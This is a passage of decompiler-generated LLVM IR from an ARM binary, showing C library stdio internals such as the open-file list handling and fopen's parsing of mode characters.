  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_155c8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_155c8, label %dec_label_pc_155cc, label %dec_label_pc_155b8.dec_label_pc_155ac_crit_edge

dec_label_pc_155b8.dec_label_pc_155ac_crit_edge:  ; preds = %dec_label_pc_155b8
  %v0_155ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_155b0.pre = load i32, i32* @r4, align 4
  %v1_155ac = inttoptr i32 %v0_155ac.pre to i32*
  %v2_155ac = load i32, i32* %v1_155ac, align 4
  store i32 %v2_155ac, i32* %r3.global-to-local, align 4
  %v3_155b0 = icmp uge i32 %v2_155ac, %v1_155b0.pre
  store i1 %v3_155b0, i1* %cpsr_c.global-to-local, align 1
  %v9_155b0 = icmp eq i32 %v2_155ac, %v1_155b0.pre
  br i1 %v9_155b0, label %dec_label_pc_155b8, label %dec_label_pc_155d0

dec_label_pc_155cc:                               ; preds = %dec_label_pc_155b8
  %v0_155cc = load i32, i32* @r4, align 4
  store i32 %v0_155cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_155d0

dec_label_pc_155d0:                               ; preds = %dec_label_pc_155a0, %dec_label_pc_155b8.dec_label_pc_155ac_crit_edge, %dec_label_pc_155cc
  %v0_155d8 = phi i32 [ %v0_155cc, %dec_label_pc_155cc ], [ %v2_155ac96, %dec_label_pc_155a0 ], [ %v2_155ac, %dec_label_pc_155b8.dec_label_pc_155ac_crit_edge ]
  %v1_155d0 = phi i32 [ %v0_155cc, %dec_label_pc_155cc ], [ %v2_155a0, %dec_label_pc_155a0 ], [ %v1_155b0.pre, %dec_label_pc_155b8.dec_label_pc_155ac_crit_edge ]
  %v3_155d0 = icmp uge i32 %v0_155d8, %v1_155d0
  store i1 %v3_155d0, i1* %cpsr_c.global-to-local, align 1
  %v9_155d0 = icmp eq i32 %v0_155d8, %v1_155d0
  br i1 %v9_155d0, label %dec_label_pc_155d8, label %dec_label_pc_155d0.dec_label_pc_155a0_crit_edge

dec_label_pc_155d0.dec_label_pc_155a0_crit_edge:  ; preds = %dec_label_pc_155d0
  %v0_155a0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_155a0

dec_label_pc_155d8:                               ; preds = %dec_label_pc_155d0
  %v2_155d8 = icmp ne i32 %v1_155d0, 0
  store i1 %v2_155d8, i1* %cpsr_c.global-to-local, align 1
  %v7_155dc = icmp slt i32 %v1_155d0, 2
  br i1 %v7_155dc, label %dec_label_pc_155f8, label %dec_label_pc_155e0

dec_label_pc_155e0:                               ; preds = %dec_label_pc_155d8
  %v0_155e0 = load i32, i32* @r7, align 4
  store i32 %v0_155e0, i32* %r0.global-to-local, align 4
  %v0_155e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_155e4 = add i32 %v0_155e4, 129
  store i32 %v1_155e4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_155f8

dec_label_pc_155f8:                               ; preds = %dec_label_pc_15570, %dec_label_pc_155e0, %dec_label_pc_155d8
  %v0_155f8 = load i32, i32* @r5, align 4
  %v1_155f8 = inttoptr i32 %v0_155f8 to i16*
  %v2_155f8 = load i16, i16* %v1_155f8, align 2
  %v3_155f8 = zext i16 %v2_155f8 to i32
  %v1_155fc = and i32 %v3_155f8, 24576
  %v1_15600 = or i32 %v1_155fc, 48
  store i32 %v1_15600, i32* %r3.global-to-local, align 4
  %v0_15604 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15604 = icmp eq i32 %v0_15604, 0
  %v1_15608 = trunc i32 %v1_15600 to i16
  store i16 %v1_15608, i16* %v1_155f8, align 2
  br i1 %v2_15604, label %dec_label_pc_15610, label %dec_label_pc_15684

dec_label_pc_15610:                               ; preds = %dec_label_pc_155f8
  %v0_15610 = load i32, i32* @r5, align 4
  %v1_15610 = add i32 %v0_15610, 60
  %v2_15610 = inttoptr i32 %v1_15610 to i32*
  %v3_15610 = load i32, i32* %v2_15610, align 4
  %v1_15614 = add i32 %v3_15610, -1
  store i32 %v1_15614, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15618 = icmp eq i32 %v1_15614, 0
  store i32 %v1_15614, i32* %v2_15610, align 4
  br i1 %v2_15618, label %dec_label_pc_15624, label %dec_label_pc_15684

dec_label_pc_15624:                               ; preds = %dec_label_pc_15610
  %v0_15624 = load i32, i32* %r3.global-to-local, align 4
  %v1_15624 = load i32, i32* @r5, align 4
  %v2_15624 = add i32 %v1_15624, 64
  %v3_15624 = inttoptr i32 %v2_15624 to i32*
  store i32 %v0_15624, i32* %v3_15624, align 4
  %v0_15628 = load i32, i32* @r5, align 4
  %v1_15628 = add i32 %v0_15628, 56
  store i32 %v1_15628, i32* @r6, align 4
  br label %dec_label_pc_1562c

dec_label_pc_1562c:                               ; preds = %dec_label_pc_1565c.dec_label_pc_1562c_crit_edge, %dec_label_pc_15624
  %v0_15634 = phi i32 [ %v0_15634.pre, %dec_label_pc_1565c.dec_label_pc_1562c_crit_edge ], [ %v1_15628, %dec_label_pc_15624 ]
  %v0_1562c = phi i32 [ %v0_1562c.pre, %dec_label_pc_1565c.dec_label_pc_1562c_crit_edge ], [ %v0_15628, %dec_label_pc_15624 ]
  %v1_1562c = add i32 %v0_1562c, 56
  %v2_1562c = inttoptr i32 %v1_1562c to i32*
  %v3_1562c = load i32, i32* %v2_1562c, align 4
  store i32 %v3_1562c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15634, i32* %r2.global-to-local, align 4
  %v1_1563882 = inttoptr i32 %v0_15634 to i32*
  %v2_1563883 = load i32, i32* %v1_1563882, align 4
  store i32 %v2_1563883, i32* %r3.global-to-local, align 4
  %v3_1563c85 = icmp uge i32 %v2_1563883, %v3_1562c
  store i1 %v3_1563c85, i1* %cpsr_c.global-to-local, align 1
  %v9_1563c91 = icmp eq i32 %v2_1563883, %v3_1562c
  br i1 %v9_1563c91, label %dec_label_pc_15644, label %dec_label_pc_1565c

dec_label_pc_15644:                               ; preds = %dec_label_pc_1562c, %dec_label_pc_15644.dec_label_pc_15638_crit_edge
  %v0_1564492 = phi i32 [ %v1_1563c.pre, %dec_label_pc_15644.dec_label_pc_15638_crit_edge ], [ %v3_1562c, %dec_label_pc_1562c ]
  store i32 %v0_1564492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15654 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15654, label %dec_label_pc_15658, label %dec_label_pc_15644.dec_label_pc_15638_crit_edge

dec_label_pc_15644.dec_label_pc_15638_crit_edge:  ; preds = %dec_label_pc_15644
  %v0_15638.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1563c.pre = load i32, i32* @r4, align 4
  %v1_15638 = inttoptr i32 %v0_15638.pre to i32*
  %v2_15638 = load i32, i32* %v1_15638, align 4
  store i32 %v2_15638, i32* %r3.global-to-local, align 4
  %v3_1563c = icmp uge i32 %v2_15638, %v1_1563c.pre
  store i1 %v3_1563c, i1* %cpsr_c.global-to-local, align 1
  %v9_1563c = icmp eq i32 %v2_15638, %v1_1563c.pre
  br i1 %v9_1563c, label %dec_label_pc_15644, label %dec_label_pc_1565c

dec_label_pc_15658:                               ; preds = %dec_label_pc_15644
  %v0_15658 = load i32, i32* @r4, align 4
  store i32 %v0_15658, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1565c

dec_label_pc_1565c:                               ; preds = %dec_label_pc_1562c, %dec_label_pc_15644.dec_label_pc_15638_crit_edge, %dec_label_pc_15658
  %v0_15664 = phi i32 [ %v0_15658, %dec_label_pc_15658 ], [ %v2_1563883, %dec_label_pc_1562c ], [ %v2_15638, %dec_label_pc_15644.dec_label_pc_15638_crit_edge ]
  %v1_1565c = phi i32 [ %v0_15658, %dec_label_pc_15658 ], [ %v3_1562c, %dec_label_pc_1562c ], [ %v1_1563c.pre, %dec_label_pc_15644.dec_label_pc_15638_crit_edge ]
  %v3_1565c = icmp uge i32 %v0_15664, %v1_1565c
  store i1 %v3_1565c, i1* %cpsr_c.global-to-local, align 1
  %v9_1565c = icmp eq i32 %v0_15664, %v1_1565c
  br i1 %v9_1565c, label %dec_label_pc_15664, label %dec_label_pc_1565c.dec_label_pc_1562c_crit_edge

dec_label_pc_1565c.dec_label_pc_1562c_crit_edge:  ; preds = %dec_label_pc_1565c
  %v0_1562c.pre = load i32, i32* @r5, align 4
  %v0_15634.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1562c

dec_label_pc_15664:                               ; preds = %dec_label_pc_1565c
  %v2_15664 = icmp ne i32 %v1_1565c, 0
  store i1 %v2_15664, i1* %cpsr_c.global-to-local, align 1
  %v7_15668 = icmp slt i32 %v1_1565c, 2
  br i1 %v7_15668, label %dec_label_pc_15684, label %dec_label_pc_1566c

dec_label_pc_1566c:                               ; preds = %dec_label_pc_15664
  %v0_1566c = load i32, i32* @r5, align 4
  %v1_1566c = add i32 %v0_1566c, 56
  store i32 %v1_1566c, i32* %r0.global-to-local, align 4
  %v0_15670 = load i32, i32* %r1.global-to-local, align 4
  %v1_15670 = add i32 %v0_15670, 129
  store i32 %v1_15670, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15684

dec_label_pc_15684:                               ; preds = %dec_label_pc_15610, %dec_label_pc_155f8, %dec_label_pc_1566c, %dec_label_pc_15664
  %v0_15684 = load i32, i32* @r5, align 4
  %v1_15684 = inttoptr i32 %v0_15684 to i16*
  %v2_15684 = load i16, i16* %v1_15684, align 2
  %v3_15684 = zext i16 %v2_15684 to i32
  store i32 %v3_15684, i32* %r3.global-to-local, align 4
  %v1_15688 = and i32 %v3_15684, 16384
  %v2_15688 = icmp eq i32 %v1_15688, 0
  br i1 %v2_15688, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_15684
  %v2_1568c = add i32 %v0_15684, 8
  %v3_1568c = inttoptr i32 %v2_1568c to i32*
  %v4_1568c = load i32, i32* %v3_1568c, align 4
  store i32 %v4_1568c, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_15684, %bb48
  %v1_15690 = xor i1 %v2_15688, true
  call void @__pseudo_cond_branch(i1 %v1_15690, i32 ptrtoint (i32* @global_var_12ad4.31 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15698 = load i32, i32* @r8, align 4
  %v2_15698 = add i32 %v0_15698, 160
  %v3_15698 = inttoptr i32 %v2_15698 to i32*
  %v4_15698 = load i32, i32* %v3_15698, align 4
  store i32 %v4_15698, i32* @r5, align 4
  %v1_1569c = add i32 %v4_15698, 8
  %v2_1569c = inttoptr i32 %v1_1569c to i32*
  %v3_1569c = load i32, i32* %v2_1569c, align 4
  store i32 %v3_1569c, i32* %r3.global-to-local, align 4
  %v1_156a0 = load i32, i32* %sl.global-to-local, align 4
  %v3_156a0 = icmp uge i32 %v3_1569c, %v1_156a0
  store i1 %v3_156a0, i1* %cpsr_c.global-to-local, align 1
  %v9_156a0 = icmp eq i32 %v3_1569c, %v1_156a0
  br i1 %v9_156a0, label %dec_label_pc_156e8, label %dec_label_pc_156a8

dec_label_pc_156a8:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_15698, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_156b475 = inttoptr i32 %v4_15698 to i32*
  %v2_156b476 = load i32, i32* %v1_156b475, align 4
  store i32 %v2_156b476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_156b878 = icmp eq i32 %v2_156b476, 0
  br i1 %v9_156b878, label %dec_label_pc_156c0, label %dec_label_pc_156d8

dec_label_pc_156c0:                               ; preds = %dec_label_pc_156a8, %dec_label_pc_156c0.dec_label_pc_156b4_crit_edge
  %v0_156c079 = phi i32 [ %v1_156b8.pre, %dec_label_pc_156c0.dec_label_pc_156b4_crit_edge ], [ 0, %dec_label_pc_156a8 ]
  store i32 %v0_156c079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_156d0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_156d0, label %dec_label_pc_156d4, label %dec_label_pc_156c0.dec_label_pc_156b4_crit_edge

dec_label_pc_156c0.dec_label_pc_156b4_crit_edge:  ; preds = %dec_label_pc_156c0
  %v0_156b4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_156b8.pre = load i32, i32* @r4, align 4
  %v1_156b4 = inttoptr i32 %v0_156b4.pre to i32*
  %v2_156b4 = load i32, i32* %v1_156b4, align 4
  store i32 %v2_156b4, i32* %r3.global-to-local, align 4
  %v3_156b8 = icmp uge i32 %v2_156b4, %v1_156b8.pre
  store i1 %v3_156b8, i1* %cpsr_c.global-to-local, align 1
  %v9_156b8 = icmp eq i32 %v2_156b4, %v1_156b8.pre
  br i1 %v9_156b8, label %dec_label_pc_156c0, label %dec_label_pc_156d8

dec_label_pc_156d4:                               ; preds = %dec_label_pc_156c0
  %v0_156d4 = load i32, i32* @r4, align 4
  store i32 %v0_156d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_156d8

dec_label_pc_156d8:                               ; preds = %dec_label_pc_156a8, %dec_label_pc_156c0.dec_label_pc_156b4_crit_edge, %dec_label_pc_156d4
  %v0_156d8 = phi i32 [ %v0_156d4, %dec_label_pc_156d4 ], [ %v2_156b476, %dec_label_pc_156a8 ], [ %v2_156b4, %dec_label_pc_156c0.dec_label_pc_156b4_crit_edge ]
  %v1_156d8 = phi i32 [ %v0_156d4, %dec_label_pc_156d4 ], [ 0, %dec_label_pc_156a8 ], [ %v1_156b8.pre, %dec_label_pc_156c0.dec_label_pc_156b4_crit_edge ]
  %v3_156d8 = icmp uge i32 %v0_156d8, %v1_156d8
  store i1 %v3_156d8, i1* %cpsr_c.global-to-local, align 1
  %v9_156d8 = icmp eq i32 %v0_156d8, %v1_156d8
  br i1 %v9_156d8, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_156d8
  %v1_156dc = load i32, i32* @r5, align 4
  store i32 %v1_156dc, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_156d8, %bb50
  %v1_156e0 = xor i1 %v9_156d8, true
  call void @__pseudo_cond_branch(i1 %v1_156e0, i32 ptrtoint (i32* @global_var_13c8c.468 to i32))
  %v0_156e4 = load i32, i32* %sl.global-to-local, align 4
  %v1_156e4 = load i32, i32* @r5, align 4
  %v2_156e4 = add i32 %v1_156e4, 8
  %v3_156e4 = inttoptr i32 %v2_156e4 to i32*
  store i32 %v0_156e4, i32* %v3_156e4, align 4
  %v0_156ec.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_156e8

dec_label_pc_156e8:                               ; preds = %bb49, %bb51
  %v0_156ec = phi i32 [ %v0_15698, %bb49 ], [ %v0_156ec.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_156ec = add i32 %v0_156ec, 80
  %v3_156ec = inttoptr i32 %v2_156ec to i32*
  %v4_156ec = load i32, i32* %v3_156ec, align 4
  store i32 %v4_156ec, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_156f4 = add i32 %v0_156ec, 160
  %v3_156f4 = inttoptr i32 %v2_156f4 to i32*
  %v4_156f4 = load i32, i32* %v3_156f4, align 4
  store i32 %v4_156f4, i32* %r0.global-to-local, align 4
  %v1_156f8 = inttoptr i32 %v4_156ec to i32*
  %v2_156f8 = load i32, i32* %v1_156f8, align 4
  store i32 %v2_156f8, i32* %r3.global-to-local, align 4
  %v1_156fc = add i32 %v4_156f4, 4
  %v2_156fc = inttoptr i32 %v1_156fc to i32*
  %v3_156fc = load i32, i32* %v2_156fc, align 4
  store i32 %v3_156fc, i32* %r1.global-to-local, align 4
  %v1_15700 = add i32 %v2_156f8, 1
  store i32 %v1_15700, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15704 = icmp eq i32 %v3_156fc, 0
  store i32 %v1_15700, i32* %v1_156f8, align 4
  br i1 %v2_15704, label %dec_label_pc_15710, label %dec_label_pc_15770

dec_label_pc_15710:                               ; preds = %dec_label_pc_156e8
  %v0_15710 = load i32, i32* %r1.global-to-local, align 4
  %v1_15710 = load i32, i32* %r0.global-to-local, align 4
  %v2_15710 = add i32 %v1_15710, 8
  %v3_15710 = inttoptr i32 %v2_15710 to i32*
  store i32 %v0_15710, i32* %v3_15710, align 4
  %v0_15714 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15714, i32* @r5, align 4
  br label %dec_label_pc_15718

dec_label_pc_15718:                               ; preds = %dec_label_pc_15748.dec_label_pc_15718_crit_edge, %dec_label_pc_15710
  %v0_15718 = phi i32 [ %v0_15718.pre, %dec_label_pc_15748.dec_label_pc_15718_crit_edge ], [ %v0_15714, %dec_label_pc_15710 ]
  %v1_15718 = inttoptr i32 %v0_15718 to i32*
  %v2_15718 = load i32, i32* %v1_15718, align 4
  store i32 %v2_15718, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15718, i32* %r2.global-to-local, align 4
  %v2_1572464 = load i32, i32* %v1_15718, align 4
  store i32 %v2_1572464, i32* %r3.global-to-local, align 4
  %v3_1572866 = icmp uge i32 %v2_1572464, %v2_15718
  store i1 %v3_1572866, i1* %cpsr_c.global-to-local, align 1
  %v9_1572872 = icmp eq i32 %v2_1572464, %v2_15718
  br i1 %v9_1572872, label %dec_label_pc_15730, label %dec_label_pc_15748

dec_label_pc_15730:                               ; preds = %dec_label_pc_15718, %dec_label_pc_15730.dec_label_pc_15724_crit_edge
  %v0_1573073 = phi i32 [ %v1_15728.pre, %dec_label_pc_15730.dec_label_pc_15724_crit_edge ], [ %v2_15718, %dec_label_pc_15718 ]
  store i32 %v0_1573073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15740 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15740, label %dec_label_pc_15744, label %dec_label_pc_15730.dec_label_pc_15724_crit_edge

dec_label_pc_15730.dec_label_pc_15724_crit_edge:  ; preds = %dec_label_pc_15730
  %v0_15724.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15728.pre = load i32, i32* @r4, align 4
  %v1_15724 = inttoptr i32 %v0_15724.pre to i32*
  %v2_15724 = load i32, i32* %v1_15724, align 4
  store i32 %v2_15724, i32* %r3.global-to-local, align 4
  %v3_15728 = icmp uge i32 %v2_15724, %v1_15728.pre
  store i1 %v3_15728, i1* %cpsr_c.global-to-local, align 1
  %v9_15728 = icmp eq i32 %v2_15724, %v1_15728.pre
  br i1 %v9_15728, label %dec_label_pc_15730, label %dec_label_pc_15748

dec_label_pc_15744:                               ; preds = %dec_label_pc_15730
  %v0_15744 = load i32, i32* @r4, align 4
  store i32 %v0_15744, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15748

dec_label_pc_15748:                               ; preds = %dec_label_pc_15718, %dec_label_pc_15730.dec_label_pc_15724_crit_edge, %dec_label_pc_15744
  %v0_15750 = phi i32 [ %v0_15744, %dec_label_pc_15744 ], [ %v2_1572464, %dec_label_pc_15718 ], [ %v2_15724, %dec_label_pc_15730.dec_label_pc_15724_crit_edge ]
  %v1_15748 = phi i32 [ %v0_15744, %dec_label_pc_15744 ], [ %v2_15718, %dec_label_pc_15718 ], [ %v1_15728.pre, %dec_label_pc_15730.dec_label_pc_15724_crit_edge ]
  %v3_15748 = icmp uge i32 %v0_15750, %v1_15748
  store i1 %v3_15748, i1* %cpsr_c.global-to-local, align 1
  %v9_15748 = icmp eq i32 %v0_15750, %v1_15748
  br i1 %v9_15748, label %dec_label_pc_15750, label %dec_label_pc_15748.dec_label_pc_15718_crit_edge

dec_label_pc_15748.dec_label_pc_15718_crit_edge:  ; preds = %dec_label_pc_15748
  %v0_15718.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15718

dec_label_pc_15750:                               ; preds = %dec_label_pc_15748
  %v2_15750 = icmp ne i32 %v1_15748, 0
  store i1 %v2_15750, i1* %cpsr_c.global-to-local, align 1
  %v7_15754 = icmp slt i32 %v1_15748, 2
  br i1 %v7_15754, label %dec_label_pc_15770, label %dec_label_pc_15758

dec_label_pc_15758:                               ; preds = %dec_label_pc_15750
  %v0_15758 = load i32, i32* @r5, align 4
  store i32 %v0_15758, i32* %r0.global-to-local, align 4
  %v0_1575c = load i32, i32* %r1.global-to-local, align 4
  %v1_1575c = add i32 %v0_1575c, 129
  store i32 %v1_1575c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15770

dec_label_pc_15770:                               ; preds = %dec_label_pc_156e8, %dec_label_pc_15758, %dec_label_pc_15750
  %v0_15770 = call i32 @_stdio_openlist_dec_use()
  %v0_15774 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_15774, i32* %r0.global-to-local, align 4
  %v2_1577c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1577c, i32* @r4, align 4
  store i32 %v6_15464, i32* @r5, align 4
  store i32 %v9_15464, i32* @r6, align 4
  store i32 %v12_15464, i32* @r7, align 4
  ret i32 %v0_15774

; uselistorder directives
  uselistorder i32 %v0_15744, { 1, 0, 2 }
  uselistorder i32 %v1_15728.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15718, { 1, 0 }
  uselistorder i32 %v0_156ec, { 1, 0 }
  uselistorder i32 %v0_156d4, { 1, 0, 2 }
  uselistorder i32 %v1_156b8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_156a0, { 1, 0 }
  uselistorder i32 %v0_15658, { 1, 0, 2 }
  uselistorder i32 %v1_1563c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_155cc, { 1, 0, 2 }
  uselistorder i32 %v1_155b0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_155a0, { 1, 0 }
  uselistorder i32 %v0_1555c, { 1, 0, 2 }
  uselistorder i32 %v1_15540.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15520, { 1, 0 }
  uselistorder i32 %v1_154ac.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 45, 4, 5, 6, 7, 8, 10, 9, 44, 11, 14, 12, 13, 15, 17, 16, 46, 18, 19, 20, 21, 22, 24, 23, 42, 25, 26, 27, 28, 30, 29, 43, 31, 32, 33, 34, 35, 36, 37, 39, 38, 41, 40 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 30, 31, 8, 9, 10, 11, 32, 33, 12, 13, 14, 15, 16, 26, 27, 17, 18, 19, 34, 35, 20, 21, 22, 23, 28, 29, 24, 25 }
  uselistorder i32 (i32)* @__GI___libc_close, { 29, 28, 27, 26, 32, 25, 31, 30, 3, 2, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 0, 7, 6, 5, 4, 1 }
  uselistorder label %dec_label_pc_15770, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15748, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15730, { 1, 0 }
  uselistorder label %dec_label_pc_156e8, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_156d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_156c0, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_15684, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1565c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15644, { 1, 0 }
  uselistorder label %dec_label_pc_155f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_155d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_155b8, { 1, 0 }
  uselistorder label %dec_label_pc_15570, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_15560, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15548, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_154e8, { 1, 0 }
  uselistorder label %dec_label_pc_154dc, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_154cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_154b4, { 1, 0 }
}

define i32 @function_15788(i32 %arg1) local_unnamed_addr {
dec_label_pc_15788:
  %v0_15788 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15788, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15788
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15788, %bb
  %v10_15790 = phi i32 [ %arg1, %dec_label_pc_15788 ], [ 0, %bb ]
  ret i32 %v10_15790

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_157a4 = call i32 @_stdio_fopen()
  ret i32 %v0_157a4
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_157b4 = load i32, i32* @r4, align 4
  store i32 %v3_157b4, i32* %stack_var_-24, align 4
  %v6_157b4 = load i32, i32* @r5, align 4
  %v9_157b4 = load i32, i32* @r6, align 4
  %v12_157b4 = load i32, i32* @r7, align 4
  %v15_157b4 = load i32, i32* @r8, align 4
  %v0_157b8 = load i32, i32* @r1, align 4
  %v1_157b8 = inttoptr i32 %v0_157b8 to i8*
  %v2_157b8 = load i8, i8* %v1_157b8, align 1
  %v2_157c0 = icmp ugt i8 %v2_157b8, 113
  store i1 %v2_157c0, i1* %cpsr_c.global-to-local, align 1
  %v7_157c0 = icmp eq i8 %v2_157b8, 114
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r8, align 4
  %v0_157cc = load i32, i32* @r0, align 4
  store i32 %v0_157cc, i32* @r7, align 4
  %v0_157d0 = load i32, i32* @r2, align 4
  store i32 %v0_157d0, i32* @r5, align 4
  %v0_157d4 = load i32, i32* @r3, align 4
  store i32 %v0_157d4, i32* @r6, align 4
  br i1 %v7_157c0, label %dec_label_pc_15828, label %dec_label_pc_157dc

dec_label_pc_157dc:                               ; preds = %entry
  %v2_157dc = icmp ugt i8 %v2_157b8, 118
  store i1 %v2_157dc, i1* %cpsr_c.global-to-local, align 1
  %v7_157dc = icmp eq i8 %v2_157b8, 119
  br i1 %v7_157dc, label %bb, label %dec_label_pc_157e8

bb:                                               ; preds = %dec_label_pc_157dc
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_1582c

dec_label_pc_157e8:                               ; preds = %dec_label_pc_157dc
  %v2_157e8 = icmp ugt i8 %v2_157b8, 96
  store i1 %v2_157e8, i1* %cpsr_c.global-to-local, align 1
  %v7_157e8 = icmp eq i8 %v2_157b8, 97
  br i1 %v7_157e8, label %bb49, label %dec_label_pc_157f4

bb49:                                             ; preds = %dec_label_pc_157e8
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_1582c

dec_label_pc_157f4:                               ; preds = %dec_label_pc_157e8, %dec_label_pc_158c4, %dec_label_pc_15898
  store i32 48872, i32* %r2.global-to-local, align 4
  %v0_157f8 = call i32 @__aeabi_read_tp()
  store i32 %v0_157f8, i32* %r0.global-to-local, align 4
  %v3_157fc = load i16, i16* @global_var_216ec.303, align 2
  %v4_157fc = sext i16 %v3_157fc to i32
  store i32 %v4_157fc, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_15804 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15804 = icmp eq i32 %v0_15804, 0
  %v3_15808 = add i32 %v4_157fc, %v0_157f8
  %v4_15808 = inttoptr i32 %v3_15808 to i32*
  store i32 22, i32* %v4_15808, align 4
  br i1 %v2_15804, label %dec_label_pc_15bcc, label %dec_label_pc_15810

dec_label_pc_15810:                               ; preds = %dec_label_pc_158e8._crit_edge, %dec_label_pc_157f4
  %v0_15810 = load i32, i32* @r5, align 4
  %v1_15810 = inttoptr i32 %v0_15810 to i16*
  %v2_15810 = load i16, i16* %v1_15810, align 2
  %v3_15810 = zext i16 %v2_15810 to i32
  store i32 %v3_15810, i32* %r3.global-to-local, align 4
  %v1_15814 = and i32 %v3_15810, 8192
  %v2_15814 = icmp eq i32 %v1_15814, 0
  br i1 %v2_15814, label %dec_label_pc_15bcc, label %dec_label_pc_1581c

